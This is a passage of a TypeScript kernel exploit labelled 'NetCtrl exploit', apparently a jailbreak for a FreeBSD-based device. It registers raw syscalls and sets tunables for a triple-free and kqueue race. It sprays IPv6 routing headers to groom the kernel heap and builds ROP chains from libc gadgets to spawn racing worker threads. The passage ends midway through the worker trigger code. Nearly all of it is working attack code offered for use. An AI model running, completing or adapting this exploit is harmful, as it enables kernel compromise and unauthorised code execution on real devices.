import { fn, syscalls, BigInt, utils, gadgets } from 'download0/types'
import { libc_addr } from 'download0/userland'
import { get_fwversion, hex, malloc, read16, read32, read64, send_notification, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
import { show_success, run_binloader } from 'download0/loader'

// include('userland.js')

if (typeof libc_addr === 'undefined') {
  include('userland.js')
}
include('kernel.js')
include('binloader.js')

// ==========================
// NetCtrl exploit
// ==========================

// Polyfill for padStart (older JS engines)
if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart (targetLength: number, padString?: string): string {
    targetLength = targetLength >> 0
    padString = String(padString !== undefined ? padString : ' ')
    if (this.length > targetLength) {
      return String(this)
    }
    targetLength = targetLength - this.length
    if (targetLength > padString.length) {
      padString += padString.repeat(targetLength / padString.length)
    }
    return padString.slice(0, targetLength) + String(this)
  }
}

/* ===========================
  *   Syscall registrations
  * ===========================
  */

fn.register(0x29, 'dup', ['bigint'], 'bigint')
const dup = fn.dup

fn.register(0x06, 'close', ['bigint'], 'bigint')
const close = fn.close

fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint')
const read = fn.read

fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint')
const write = fn.write

fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint')
const ioctl = fn.ioctl

fn.register(0x2A, 'pipe', ['bigint'], 'bigint')
const pipe = fn.pipe

fn.register(0x16A, 'kqueue', [], 'bigint')
const kqueue = fn.kqueue

fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint')
const socket = fn.socket

fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint')
const socketpair = fn.socketpair

fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint')
const getsockopt = fn.getsockopt

fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint')
const setsockopt = fn.setsockopt

fn.register(0x17, 'setuid', ['number'], 'bigint')
const setuid = fn.setuid

fn.register(20, 'getpid', [], 'bigint')
const getpid = fn.getpid

fn.register(0x14B, 'sched_yield', [], 'bigint')
const sched_yield = fn.sched_yield

fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const cpuset_getaffinity = fn.cpuset_getaffinity

fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const cpuset_setaffinity = fn.cpuset_setaffinity

fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint')
const rtprio_thread = fn.rtprio_thread

fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint')
const netcontrol = fn.netcontrol

fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint')
const thr_new = fn.thr_new

fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint')
const thr_kill = fn.thr_kill

fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint')
const nanosleep = fn.nanosleep

fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint')
const fcntl = fn.fcntl

/* ===========================
  *   ROP wrappers from syscalls.map
  * ===========================
  */

const read_wrapper = syscalls.map.get(0x03)!
const write_wrapper = syscalls.map.get(0x04)!
const sched_yield_wrapper = syscalls.map.get(0x14b)!
const cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8)!
const rtprio_thread_wrapper = syscalls.map.get(0x1D2)!
const recvmsg_wrapper = syscalls.map.get(0x1B)!
const readv_wrapper = syscalls.map.get(0x78)!
const writev_wrapper = syscalls.map.get(0x79)!
const thr_exit_wrapper = syscalls.map.get(0x1af)!
const thr_suspend_ucontext_wrapper = syscalls.map.get(0x278)!
const setsockopt_wrapper = syscalls.map.get(0x69)!
const getsockopt_wrapper = syscalls.map.get(0x76)!

/* ===========================
  *   setjmp / longjmp
  * ===========================
  */

fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint')
const setjmp = fn.setjmp
const setjmp_addr = libc_addr.add(0x6CA00)
const longjmp_addr = libc_addr.add(0x6CA50)

/* ===========================
  *   Constants
  * ===========================
  */

const BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF)
const KERNEL_PID = 0
const SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007)

const FIOSETOWN = 0x8004667C
const PAGE_SIZE = 0x4000

const NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
const NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007

const AF_UNIX = 1
const AF_INET6 = 28
const SOCK_STREAM = 1
const IPPROTO_IPV6 = 41

const SO_SNDBUF = 0x1001
const SOL_SOCKET = 0xffff

const IPV6_RTHDR = 51
const IPV6_RTHDR_TYPE_0 = 0

const RTP_PRIO_REALTIME = 2

const UIO_READ = 0
const UIO_WRITE = 1
const UIO_SYSSPACE = 1

const CPU_LEVEL_WHICH = 3
const CPU_WHICH_TID = 1

const IOV_SIZE = 0x10
const CPU_SET_SIZE = 0x10
const PIPEBUF_SIZE = 0x18
const MSG_HDR_SIZE = 0x30
const FILEDESCENT_SIZE = 0x8
const UCRED_SIZE = 0x168

const RTHDR_TAG = 0x13370000
const UIO_IOV_NUM = 0x14
const MSG_IOV_NUM = 0x17

/* ===========================
  *   Tunables (stability)
  * ===========================
  */

const IPV6_SOCK_NUM = 96
const IOV_THREAD_NUM = 8
const UIO_THREAD_NUM = 8

const MAIN_LOOP_ITERATIONS = 3
const TRIPLEFREE_ITERATIONS = 8
const KQUEUE_ITERATIONS = 20000

const MAX_ROUNDS_TWIN = 5
const MAX_ROUNDS_TRIPLET = 200

const MAIN_CORE = 4
const MAIN_RTPRIO = 0x100

const RTP_LOOKUP = 0
const RTP_SET = 1
const PRI_REALTIME = 2

const F_SETFL = 4
const O_NONBLOCK = 4

let FW_VERSION: string | null = null // Set in init()
let kernel_offset: unknown

/* ===========================
  *   Global state
  * ===========================
  */

interface Worker {
  rop: BigInt[]
  loop_size: number
  pipe_0: number
  pipe_1: number
  ready: BigInt
  done: BigInt
  signal_buf: BigInt
  thread_id?: number
}

const iov_recvmsg_workers: Worker[] = []
const uio_readv_workers: Worker[] = []
const uio_writev_workers: Worker[] = []
let spray_ipv6_worker: Worker

const twins: number[] = new Array(2)
const triplets: number[] = new Array(3)
const ipv6_socks: BigInt[] = new Array(IPV6_SOCK_NUM)

const spray_rthdr = malloc(UCRED_SIZE)
let spray_rthdr_len = -1
const leak_rthdr = malloc(UCRED_SIZE)

// Buffers for potential ROP-based spray/read (kept for structure, can be unused safely)
const spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE)
const read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8)

const check_len = malloc(4)
write32(check_len, 8)

let fdt_ofiles = new BigInt(0)
const master_r_pipe_file = new BigInt(0)
const victim_r_pipe_file = new BigInt(0)
let master_r_pipe_data = new BigInt(0)
let victim_r_pipe_data = new BigInt(0)

const master_pipe_buf = malloc(PIPEBUF_SIZE)
const msg = malloc(MSG_HDR_SIZE)
const msgIov = malloc(MSG_IOV_NUM * IOV_SIZE)

const uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE)
const uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE)

const uio_sock = malloc(8)
const iov_sock = malloc(8)

const iov_thread_ready = malloc(8 * IOV_THREAD_NUM)
const iov_thread_done = malloc(8 * IOV_THREAD_NUM)
const iov_signal_buf = malloc(8 * IOV_THREAD_NUM)

const uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM)
const uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM)
const uio_readv_signal_buf = malloc(8 * UIO_THREAD_NUM)

const uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM)
const uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM)
const uio_writev_signal_buf = malloc(8 * UIO_THREAD_NUM)

const spray_ipv6_ready = malloc(8)
const spray_ipv6_done = malloc(8)
const spray_ipv6_signal_buf = malloc(8)
const spray_ipv6_stack = malloc(0x2000)

let uaf_socket: number | undefined
let uio_sock_0: number
let uio_sock_1: number
let iov_sock_0: number
let iov_sock_1: number

const pipe_sock = malloc(8)
const master_pipe: [number, number] = [0, 0]
const victim_pipe: [number, number] = [0, 0]

let masterRpipeFd: number
let masterWpipeFd: number
let victimRpipeFd: number
let victimWpipeFd: number

let kq_fdp: BigInt
let kl_lock: BigInt

const tmp = malloc(PAGE_SIZE)

let saved_fpu_ctrl = 0
let saved_mxcsr = 0

/* ===========================
  *   Helpers
  * ===========================
  */

function init_threading (): void {
  const jmpbuf = malloc(0x60)
  setjmp(jmpbuf)
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)))
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)))
}

function build_rthdr (buf: BigInt, size: number): number {
  const len = ((size >> 3) - 1) & ~1
  const actual_size = (len + 1) << 3

  write8(buf.add(0x00), 0)                // ip6r_nxt
  write8(buf.add(0x01), len)              // ip6r_len
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0)
  write8(buf.add(0x03), len >> 1)         // ip6r_segleft

  return actual_size
}

function set_sockopt (
  sd: BigInt,
  level: number,
  optname: number,
  optval: BigInt,
  optlen: number
): BigInt {
  const result = setsockopt(sd, level, optname, optval, optlen)
  if (result.eq(BigInt_Error)) {
    throw new Error('set_sockopt error: ' + hex(result))
  }
  return result
}

const sockopt_len_ptr = malloc(4)
const nanosleep_timespec = malloc(0x10)
const cpu_mask_buf = malloc(0x10)
const rtprio_scratch = malloc(0x4)
const sockopt_val_buf = malloc(4)
const nc_set_buf = malloc(8)
const nc_clear_buf = malloc(8)
const spawn_thr_args = malloc(0x80)
const spawn_tid = malloc(0x8)
const spawn_cpid = malloc(0x8)

function get_sockopt (
  sd: BigInt,
  level: number,
  optname: number,
  optval: BigInt,
  optlen: number
): number {
  write32(sockopt_len_ptr, optlen)
  const result = getsockopt(sd, level, optname, optval, sockopt_len_ptr)
  if (result.eq(BigInt_Error)) {
    throw new Error('get_sockopt error: ' + hex(result))
  }
  return read32(sockopt_len_ptr)
}

function set_rthdr (sd: BigInt, buf: BigInt, len: number): BigInt {
  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
}

function get_rthdr (sd: BigInt, buf: BigInt, max_len: number): number {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len)
}

function free_rthdrs (sds: BigInt[]): void {
  for (const sd of sds) {
    if (!sd.eq(BigInt_Error)) {
      set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
    }
  }
}

function free_rthdr (sd: BigInt): void {
  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
}

function pin_to_core (core: number): void {
  write32(cpu_mask_buf, 1 << core)
  cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Error, CPU_SET_SIZE, cpu_mask_buf)
}

function get_core_index (mask_addr: BigInt): number {
  let num = Number(read32(mask_addr))
  let position = 0
  while (num > 0) {
    num = num >>> 1
    position++
  }
  return position - 1
}

function get_current_core (): number {
  cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, BigInt_Error, CPU_SET_SIZE, cpu_mask_buf)
  return get_core_index(cpu_mask_buf)
}

function set_rtprio (prio: number): void {
  write16(rtprio_scratch, PRI_REALTIME)
  write16(rtprio_scratch.add(2), prio)
  rtprio_thread(RTP_SET, 0, rtprio_scratch)
}

function get_rtprio (): number {
  write16(rtprio_scratch, PRI_REALTIME)
  write16(rtprio_scratch.add(2), 0)
  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch)
  return Number(read16(rtprio_scratch.add(2)))
}

function fill_buffer_64 (addr: BigInt, value: BigInt, size: number): void {
  for (let i = 0; i < size; i += 8) {
    write64(addr.add(i), value)
  }
}
/* ===========================
  *   wait_for helper
  * =========================== */
function wait_for (addr: BigInt, value: number): void {
  while (!read64(addr).eq(new BigInt(value))) {
    sched_yield()
  }
}
/* ===========================
  *   ROP regen & thread spawn
  * ===========================
  */

function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number): void {
  let new_rop_entry = last_rop_entry.add(8)
  let copy_entry = last_rop_entry.sub(number_entries * 8).add(8)
  const rop_loop = last_rop_entry.sub(number_entries * 8).add(8)

  for (let i = 0; i < number_entries; i++) {
    const entry_add = copy_entry
    const entry_val = read64(copy_entry)

    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET)
    write64(new_rop_entry.add(0x8), entry_add)
    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET)
    write64(new_rop_entry.add(0x18), entry_val)
    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

    copy_entry = copy_entry.add(8)
    new_rop_entry = new_rop_entry.add(0x28)
  }

  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET)
  write64(new_rop_entry.add(0x8), rop_loop)
}

function spawn_thread (rop_array: BigInt[], loop_entries: number, predefinedStack?: BigInt): BigInt {
  const rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600)

  for (let i = 0; i < rop_array.length; i++) {
    write64(rop_addr.add(i * 8), rop_array[i])
  }

  if (loop_entries !== 0) {
    const last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8)
    rop_regen_and_loop(last_rop_entry, loop_entries)
  }

  const jmpbuf = malloc(0x60)

  write64(jmpbuf.add(0x00), gadgets.RET)
  write64(jmpbuf.add(0x10), rop_addr)
  write32(jmpbuf.add(0x40), saved_fpu_ctrl)
  write32(jmpbuf.add(0x44), saved_mxcsr)

  const stack_size = new BigInt(0x100)
  const tls_size = new BigInt(0x40)

  const stack = malloc(Number(stack_size))
  const tls = malloc(Number(tls_size))

  write64(spawn_thr_args.add(0x00), longjmp_addr)
  write64(spawn_thr_args.add(0x08), jmpbuf)
  write64(spawn_thr_args.add(0x10), stack)
  write64(spawn_thr_args.add(0x18), stack_size)
  write64(spawn_thr_args.add(0x20), tls)
  write64(spawn_thr_args.add(0x28), tls_size)
  write64(spawn_thr_args.add(0x30), spawn_tid)
  write64(spawn_thr_args.add(0x38), spawn_cpid)

  const result = thr_new(spawn_thr_args, 0x68)
  if (!result.eq(new BigInt(0))) {
    throw new Error('thr_new failed: ' + hex(result))
  }
  return read64(spawn_tid)
}

/* ===========================
  *   ROP Worker Builders
  * ===========================
  */

function iov_recvmsg_worker_rop (
  ready_signal: BigInt,
  run_fd: BigInt,
  done_signal: BigInt,
  signal_buf: BigInt
): { rop: BigInt[], loop_size: number } {
  const rop: BigInt[] = []

  rop.push(new BigInt(0))

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << MAIN_CORE)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(CPU_LEVEL_WHICH))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(CPU_WHICH_TID))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)
  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(CPU_SET_SIZE))
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), MAIN_RTPRIO)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(RTP_SET))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length

  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(iov_sock_0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(msg)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(0))
  rop.push(recvmsg_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_end = rop.length
  const loop_size = loop_end - loop_init

  return { rop, loop_size }
}

function uio_readv_worker_rop (
  ready_signal: BigInt,
  run_fd: BigInt,
  done_signal: BigInt,
  signal_buf: BigInt
): { rop: BigInt[], loop_size: number } {
  const rop: BigInt[] = []

  rop.push(new BigInt(0))

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << MAIN_CORE)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(CPU_LEVEL_WHICH))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(CPU_WHICH_TID))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)
  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(CPU_SET_SIZE))
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), MAIN_RTPRIO)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(RTP_SET))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length

  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(uio_sock_0))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(uioIovWrite)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(UIO_IOV_NUM))
  rop.push(readv_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_end = rop.length
  const loop_size = loop_end - loop_init

  return { rop, loop_size }
}

function uio_writev_worker_rop (
  ready_signal: BigInt,
  run_fd: BigInt,
  done_signal: BigInt,
  signal_buf: BigInt
): { rop: BigInt[], loop_size: number } {
  const rop: BigInt[] = []

  rop.push(new BigInt(0))

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << MAIN_CORE)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(CPU_LEVEL_WHICH))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(CPU_WHICH_TID))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)
  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(CPU_SET_SIZE))
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), MAIN_RTPRIO)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(RTP_SET))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length

  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(uio_sock_1))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(uioIovRead)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(UIO_IOV_NUM))
  rop.push(writev_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_end = rop.length
  const loop_size = loop_end - loop_init

  return { rop, loop_size }
}

function ipv6_sock_spray_and_read_rop (
  ready_signal: BigInt,
  run_fd: BigInt,
  done_signal: BigInt,
  signal_buf: BigInt
): { rop: BigInt[], loop_size: number } {
  const rop: BigInt[] = []

  rop.push(new BigInt(0))

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << MAIN_CORE)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(CPU_LEVEL_WHICH))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(CPU_WHICH_TID))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)
  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(CPU_SET_SIZE))
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), MAIN_RTPRIO)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(RTP_SET))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length

  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)

  for (let i = 0; i < ipv6_socks.length; i++) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(ipv6_socks[i])
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(IPPROTO_IPV6))
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(IPV6_RTHDR))
    rop.push(gadgets.POP_RCX_RET)
    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE))
    rop.push(gadgets.POP_R8_RET)
    rop.push(new BigInt(spray_rthdr_len))
    rop.push(setsockopt_wrapper)
  }

  for (let j = 0; j < ipv6_socks.length; j++) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(ipv6_socks[j])
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(IPPROTO_IPV6))
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(IPV6_RTHDR))
    rop.push(gadgets.POP_RCX_RET)
    rop.push(read_rthdr_rop.add(j * 8))
    rop.push(gadgets.POP_R8_RET)
    rop.push(check_len)
    rop.push(getsockopt_wrapper)
  }

  rop.push(gadgets.POP_RDI_RET)
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(0))
  rop.push(thr_exit_wrapper)

  return {
    rop,
    loop_size: 0
  }
}

/* ===========================
  *   Worker Creation
  * ===========================
  */

function create_workers (): void {
  const sock_buf = malloc(8)

  // iov_recvmsg workers
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    const ready = iov_thread_ready.add(8 * i)
    const done = iov_thread_done.add(8 * i)
    const signal_buf = iov_signal_buf.add(8 * i)

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
    const pipe_0 = read32(sock_buf)
    const pipe_1 = read32(sock_buf.add(4))

    const ret = iov_recvmsg_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)

    const worker: Worker = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0,
      pipe_1,
      ready,
      done,
      signal_buf
    }
    iov_recvmsg_workers[i] = worker
  }

  // uio_readv workers
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const ready = uio_readv_thread_ready.add(8 * i)
    const done = uio_readv_thread_done.add(8 * i)
    const signal_buf = uio_readv_signal_buf.add(8 * i)

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
    const pipe_0 = read32(sock_buf)
    const pipe_1 = read32(sock_buf.add(4))

    const ret = uio_readv_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)

    const worker: Worker = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0,
      pipe_1,
      ready,
      done,
      signal_buf
    }
    uio_readv_workers[i] = worker
  }

  // uio_writev workers
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const ready = uio_writev_thread_ready.add(8 * i)
    const done = uio_writev_thread_done.add(8 * i)
    const signal_buf = uio_writev_signal_buf.add(8 * i)

    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
    const pipe_0 = read32(sock_buf)
    const pipe_1 = read32(sock_buf.add(4))

    const ret = uio_writev_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)

    const worker: Worker = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0,
      pipe_1,
      ready,
      done,
      signal_buf
    }
    uio_writev_workers[i] = worker
  }

  // spray_ipv6 worker (حتى لو مش هتستخدمه، نخليه مطابق للتوينز)
  const ready = spray_ipv6_ready
  const done = spray_ipv6_done
  const signal_buf = spray_ipv6_signal_buf

  socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
  const pipe_0 = read32(sock_buf)
  const pipe_1 = read32(sock_buf.add(4))

  const ret = ipv6_sock_spray_and_read_rop(ready, new BigInt(pipe_0), done, signal_buf)

  spray_ipv6_worker = {
    rop: ret.rop,
    loop_size: ret.loop_size,
    pipe_0,
    pipe_1,
    ready,
    done,
    signal_buf
  }
}

/* ===========================
  *   Worker Initialization
  * ===========================
  */

function init_workers (): void {
  init_threading()

  let worker: Worker
  let ret: BigInt

  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i]!
    ret = spawn_thread(worker.rop, worker.loop_size)
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']')
    }
    const thread_id = Number(ret.and(0xFFFFFFFF))
    worker.thread_id = thread_id
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i]!
    ret = spawn_thread(worker.rop, worker.loop_size)
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_readv_workers[' + i + ']')
    }
    const thread_id = Number(ret.and(0xFFFFFFFF))
    worker.thread_id = thread_id
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i]!
    ret = spawn_thread(worker.rop, worker.loop_size)
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_writev_workers[' + i + ']')
    }
    const thread_id = Number(ret.and(0xFFFFFFFF))
    worker.thread_id = thread_id
  }
}

/* ===========================
  *   Worker Trigger / Wait
  * ===========================
  */

function trigger_iov_recvmsg (): void {
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    write64(iov_recvmsg_workers[i].done, 0)
  }

  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    const worker = iov_recvmsg_workers[i]
    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (ret.eq(BigInt_Error)) {
      throw new Error(`Could not signal 'run' iov_recvmsg_workers[${i}]`)
    }
  }
}

function wait_iov_recvmsg (): void {
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    wait_for(iov_recvmsg_workers[i].done, 1)
  }
}

function trigger_uio_readv (): void {
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    write64(uio_readv_workers[i].done, 0)
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const worker = uio_readv_workers[i]
    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (ret.eq(BigInt_Error)) {
      throw new Error(`Could not signal 'run' uio_readv_workers[${i}]`)
    }
  }
}

function wait_uio_readv (): void {
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    wait_for(uio_readv_workers[i].done, 1)
  }
}

function trigger_uio_writev (): void {
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    write64(uio_writev_workers[i].done, 0)
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const worker = uio_writev_workers[i]
    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (ret.eq(BigInt_Error)) {
      throw new Error(`Could not signal 'run' uio_writev_workers[${i}]`)
